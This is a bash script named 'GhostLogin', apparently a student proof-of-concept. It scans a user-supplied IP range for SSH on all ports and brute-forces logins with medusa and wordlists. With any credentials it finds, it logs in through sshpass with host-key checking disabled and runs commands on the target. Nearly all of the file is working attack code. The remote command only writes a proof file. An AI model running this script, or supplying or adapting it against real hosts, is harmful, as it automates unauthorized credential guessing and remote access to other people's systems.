#!/bin/bash

#set time stamp and variables
ts=$(date +%d-%H:%M)
mkdir -p ~/reports/project/nmap
audit_path="$HOME/reports/project/"

if command -v figlet &> /dev/null; then
    figlet "GhostLogin"
else
    echo "--- GhostLogin ---"
fi

function check_user_id() {
user_id=$(id -u)
    if [[ $user_id == "0" ]];
        then
            echo "The script is running with root privilege"
        else
            echo "The script must run with root! exit now. bye bye"
            exit 1
    fi
}
#validet user ip address input

function target_network() {
read -p "Please enter target IP address or Range:" target_ip
if [[ -z $target_ip ]];
    then
        echo "there is no aviable ip address"
    else
        if [[ ! $target_ip =~ ^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\/([0-9]|[1-2][0-9]|3[0-2]))?$ ]];
        then
            echo "IP address in is not valid. run the script again with valid IP"
            exit 1
        else
            echo "your target ip address is $target_ip"
        fi
fi
}

#checking tools instaltion and install if missing
#creating tools list and run for loop to check and install
function check_installtion() {
#my tool list
tools=("curl" "nmap" "sshpass" "medusa")
#using for loop with a list call object from the list with ${tools[@]}
for tool in "${tools[@]}"; do
    if command -v "$tool" > /dev/null 2>&1 ;
        then
            echo "$tool is insttaled"
        else
            apt install $tool -y > /dev/null 2>&1

    fi
done 

}
#this function will scan the target ip address and try to find ssh service on the target ip address
#for the POC i eill use port number 22 but in real time i will use -p- to check if ssh service running on
#diff port number  
function network_discovery(){

    nmap -p- -sV --open $target_ip -oG "$audit_path/nmap/discovery.gnmap" > /dev/null 2>&1
    ssh_hosts=$(grep "ssh" "$audit_path/nmap/discovery.gnmap" | awk -F' ' '{for(i=1;i<=NF;i++) if($i ~ /ssh/) print $2":"$i}' | cut -d'/' -f1)
    if [[ -n $ssh_hosts ]];
        then
            echo "SSH Found in the network" 
            echo "Targets identified: $ssh_hosts"
        else
            echo "SSH service did NOT found in the network"
            exit 1
    fi

}

function BF() {
    read -p "Please aprove the bruteforce step [Y] to approve [N] to cancel:" user_choice
    if [[ $user_choice = "Y" || $user_choice == "y" ]];
        then
            echo "You aggre to the BF procces the tool will start soon"
            read -p "Please choose if to run the BF with defult [D] wordlist or user wordlist [U]:" wordlist
            if [[ $wordlist = "D" || $wordlist == "d" ]];
                then
                    my_user_list='/home/kali/wordlists/users'
                    my_password_list='/home/kali/wordlists/pass'
                else
                    read -p "please enter your user list file path" my_user_list
                    read -p "please enter your password list file path" my_password_list
            fi
            for target_info in $ssh_hosts; do
                host=$(echo $target_info | cut -d':' -f1)
                port=$(echo $target_info | cut -d':' -f2)

                echo "Starting Brute Force on host: $host at port: $port"

                medusa -h $host -n $port -U $my_user_list -P $my_password_list -M ssh >> "$audit_path/$ts.BF_result"

                if grep $host "$audit_path/$ts.BF_result" | grep -q "ACCOUNT FOUND"; 
                    then
                        found_user=$(grep $host "$audit_path/$ts.BF_result" | grep "ACCOUNT FOUND" | awk -F 'User: ' '{print $2}' | awk '{print $1}') 
                        found_pass=$(grep $host "$audit_path/$ts.BF_result" | grep "ACCOUNT FOUND" | awk -F 'Password: ' '{print $2}' | awk '{print $1}') 
                
                        echo "[SUCCESS] Account found on $host: User: $found_user, Pass: $found_pass" 
            
                        remote_target_session "$host" "$found_user" "$found_pass" "$port"
                    else
                        echo "[FAILED] No credentials found for $host"
                fi
            done

        else
            echo "cancel all bye bye"
            exit 1
    fi

}

function remote_target_session(){

    local target=$1
    local user=$2
    local pass=$3
    local port=$4

    echo "The script will execute command on $target using SSH service with the BF output"
    sshpass -p "$pass" ssh -p $port -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $user@$target "uptime; touch /tmp/proof.txt" >> "$audit_path/$ts.remote_output"

}

function creativity_report() {
    echo "--- GhostLogin Final Summary ---"
    echo "--- GhostLogin Final Summary ---" > "$audit_path/final_summary.txt"
    echo "Scan Date: $(date)" >> "$audit_path/final_summary.txt"
    echo "Target Range: $target_ip" >> "$audit_path/final_summary.txt"
    echo "Successful Logins Found in: $ts.BF_result" >> "$audit_path/final_summary.txt"

    echo -e "\n[+] Remote Execution Proof (Output from Targets):"
    if [ -f "$audit_path/$ts.remote_output" ]; then
        cat "$audit_path/$ts.remote_output"
    else
        echo "No remote output found (Check if BF was successful)."
    fi

    echo -e "\nImprovement: Automated centralized logging added."

    #Removing temporary scan results fiels
    rm -rf "$audit_path/nmap"
    echo "[*] Cleanup complete: Temporary scan files removed."
}

check_user_id
target_network
check_installtion
network_discovery
BF
creativity_report

